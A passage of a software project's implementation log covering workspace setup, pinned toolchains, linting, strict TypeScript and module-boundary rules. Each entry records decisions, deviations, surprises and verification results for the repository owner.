A single owner **cannot satisfy four-eyes approval** (`REQ-ADMIN-002`, `SC-GOV-02`). That control is now structurally unsatisfiable and must be resolved before `STEP-021` — either a second reviewer or an explicit accepted-risk decision.

### Verification
| Check | Result |
| --- | --- |
| `CODEOWNERS` coverage — all paths owned | PASS |
| TS 7 config valid; `noUncheckedIndexedAccess` still enforced | PASS (exit 0 / exit 1 respectively) |
| Boundary rule fires after rewrite | PASS |
| R5 gap closed — 178 paths owned | PASS |
| `pnpm verify` | PASS |

---

## IMPL-002 — STEP-001.02 — Formatting, linting, strict TypeScript and module boundaries

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001 (and enables ADR-003 enforcement) |
| Blast radius | BR-002 (LOW) |
| Graph indexed commit | `11e47a6` — **found stale at `2fe8318`, refreshed per protocol step 3 before proceeding** |
| Commit | *(this commit)* |

### What was built
`.editorconfig`, `biome.json` (Biome 2.5.7), `tsconfig.base.json` (TypeScript 7.0.3, strict + `noUncheckedIndexedAccess` + `exactOptionalPropertyTypes`), `.dependency-cruiser.cjs` module boundary rules, four guards in `tests/guards/`, and a full `pnpm verify` chain covering both JS and Python.

### Why this approach
**Module boundaries are enforced from before the first source file exists.** `ADR-003` chose a modular monolith on the promise it can be split later; that promise is only real if cross-module reach-ins fail the build. Adding the rule after packages exist means retrofitting against violations already written.

The five boundary rules encode architecture decisions directly:
- `no-cross-module-internals` — packages expose entry points, not internals
- `services-not-imported-by-web` — the web app talks to services over generated clients only
- `no-generated-edits` — protects `REQ-PLAT-007`
- `no-circular` — circular imports are the leading indicator of boundary erosion
- `no-orphans` (warn) — surfaces dead modules

### Decisions taken during implementation
| Decision | Alternatives | Rationale | Promoted to ADR? |
| --- | --- | --- | --- |
| **TypeScript 7.0.3, not 7.0.2** | Adopt latest | Blueprint baseline is TS 6.0. Honoring a documented decision is not a new decision; deviating would be. **TS 7 surfaced to the owner for explicit `ASM-004` revalidation rather than silently adopted** | Not yet — pending owner |
| Biome over ESLint+Prettier | ESLint ecosystem | Baseline is silent on linter; Biome is one tool for lint+format, and nothing depends on it yet so it is cheaply replaceable | No |
| dependency-cruiser for boundaries | Biome/ESLint import rules | Only tool that expresses cross-package path rules with the needed precision | No |
| Vacuous-pass guards for empty tree | Omit the scripts until code exists | `tsc` and `mypy` error on an empty tree — a false failure. Guards make the empty case **explicit and self-documenting** rather than silently skipped, and convert to real checks the moment source lands | No |

### Deviations from the step file
Sub-step listed "per-package `tsconfig.json` extending the base" — **deferred**, because zero packages exist. It moves to STEP-002 where the first package is created. Recorded rather than silently dropped.

### What surprised us
1. **The pre-change analysis earned its keep.** It found `BUG-002` (`node_modules` tracked) before any code was written — a defect no existing test covered.
2. **The graph was stale on entry** (`2fe8318` vs `11e47a6`). Protocol step 3 says refresh before continuing; had I skipped it, the analysis would have been against the wrong tree.
3. **Biome rejected its own config twice** — a deprecated `recommended` field and formatting that did not match its own formatter. Fixed via `biome migrate --write` and self-format. A linter that lints its own configuration is a genuinely good property.

### Follow-up created
| Item | Type | ID |
| --- | --- | --- |
| TypeScript 7 vs 7 baseline decision | **Open — owner** | `ASM-004` revalidation |
| Per-package `tsconfig.json` | Deferred | STEP-002 |
| Real lint/typecheck targets | Deferred | STEP-002 |
| `node_modules` artifact guard | Regression test | BUG-002 |

### Verification
| Check | Result |
| --- | --- |
| `pnpm verify` (10-command chain) | **PASS** |
| Boundary rule meta-test | **PASS** — rule `no-cross-module-internals` fired on seeded violation |
| Artifact guard meta-test | **PASS** — exit 1 on seeded `dist/seeded.js` |
| `ruff check` / `ruff format --check` | PASS — 12 files formatted |
| `detect_changes()` | 0 changed symbols, 4 changed files, risk low |

---

## IMPL-001 — STEP-001.01 — Workspace skeleton and pinned toolchain

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001, REQ-PLAT-002 |
| Blast radius | BR-001 (LOW) |
| Graph indexed commit | `c37d106` — matched HEAD at pre-change |

### What was built
pnpm workspace (`package.json`, `pnpm-workspace.yaml`) and uv Python workspace
(`pyproject.toml`), version pins (`.nvmrc` 24, `.python-version` 3.14), workspace
directories (`apps/`, `packages/`, `services/`, `tests/`) with boundary READMEs,
and both lock files generated.

### Why this approach
Two toolchain decisions were escalated to the repository owner under `ADR-007`
(propose, then confirm), because the environment did not match the documented plan:

| Decision | Environment finding | Owner choice |
| --- | --- | --- |
| Package manager | pnpm absent, corepack unavailable | **Install pnpm globally** (over npm workspaces) |
| Node runtime | local v25.9.0 vs. Node 24 LTS baseline | **Install Node 24 locally** (over adopting 25) |

Both preserve the blueprint baseline rather than bending it to the machine, which
keeps `ASM-004` honest.

### Decisions taken during implementation
| Decision | Alternatives | Rationale | Promoted to ADR? |
| --- | --- | --- | --- |
| Ruff `DTZ` rule enabled | Default rule set | Flags naive datetimes. This product has three time axes; a naive datetime becomes an infeasible itinerary in STEP-012 | No — captured in `pyproject.toml` comment |
| Placeholder scripts exit 0 with a `[STEP-001.02]` marker | Omit scripts entirely | `pnpm verify` is runnable from day one; markers make the gap visible rather than silent | No |
| pytest markers for `security`/`contract`/`property` | Add later | R7 and R2 need selectable suites from the first test | No |

### Deviations from the step file
None in scope. The step file assumed pnpm and Node 24 were present; both had to be
installed first. Recorded as environment facts, not scope change.

### What surprised us
Two things, both instructive:

1. **`pnpm install` was the first thing in this repository that actually executed
   anything** — and it immediately found `BUG-001`, a defect present in 110 files
   for hours. Markdown had silently absorbed it.
2. **The regression guard reproduced the bug inside itself.** Embedding the literal
   offending pattern truncated the guard's own source file. Fixed by assembling the
   pattern at runtime; the failure mode is now documented in the guard's header so
   nobody "simplifies" it back.

### Follow-up created
| Item | Type | ID |
| --- | --- | --- |
| Stray-markup guard | Regression test | `tests/guards/no-stray-markup.sh` |
| Lock-file drift CI enforcement | Deferred | STEP-001.03 |
| Node 24 PATH is not persistent (keg-only brew install) | Documentation | STEP-001.05 README |

### Verification
| Check | Result |
| --- | --- |
| `pnpm install` under Node 24.19.0 | PASS — `pnpm-lock.yaml` created |
| `uv sync` | PASS — Python 3.14.2 resolved, `uv.lock` created |
| `pnpm verify` | PASS |
| Regression R1–R7 | See REGRESSION_LOG |

---

## What must be logged

| Event | Log here | Also log |
| --- | --- | --- |
| Sub-step implemented | ✅ | Regression log, tracker |
| Bug found during implementation | Reference it | [BUG_REGISTER](BUG_REGISTER.md) |
| Bug fixed | Reference it | [BUG_REGISTER](BUG_REGISTER.md) + regression test |
| Enhancement beyond requirement | Reference it | [ENHANCEMENT_LOG](ENHANCEMENT_LOG.md) |
| Architectural decision taken mid-work | ✅ + promote | [DECISION_LOG](../02-delivery/DECISION_LOG.md) as an ADR |
| Assumption invalidated | ✅ | [ASSUMPTION_REGISTER](../02-delivery/ASSUMPTION_REGISTER.md) |
| Approach abandoned | ✅ **with the reason** | Sub-step marked `DROPPED` |
| Dependency or version change | ✅ | Blast-radius record |

**Negative results are recorded, not discarded** (portfolio standard §7.38). An approach that failed and why is more valuable to the next engineer than a clean history that hides it.
